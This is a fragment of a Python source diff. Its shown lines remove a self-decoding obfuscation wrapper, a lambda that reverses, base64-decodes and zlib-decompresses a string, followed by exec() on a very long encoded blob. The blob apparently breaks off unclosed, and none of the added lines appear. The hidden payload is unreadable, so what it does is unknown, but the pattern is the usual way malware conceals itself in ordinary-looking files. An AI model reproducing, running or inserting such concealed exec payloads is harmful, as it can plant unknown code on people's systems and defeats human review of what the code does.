@@ -1,2 +1,1628 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'==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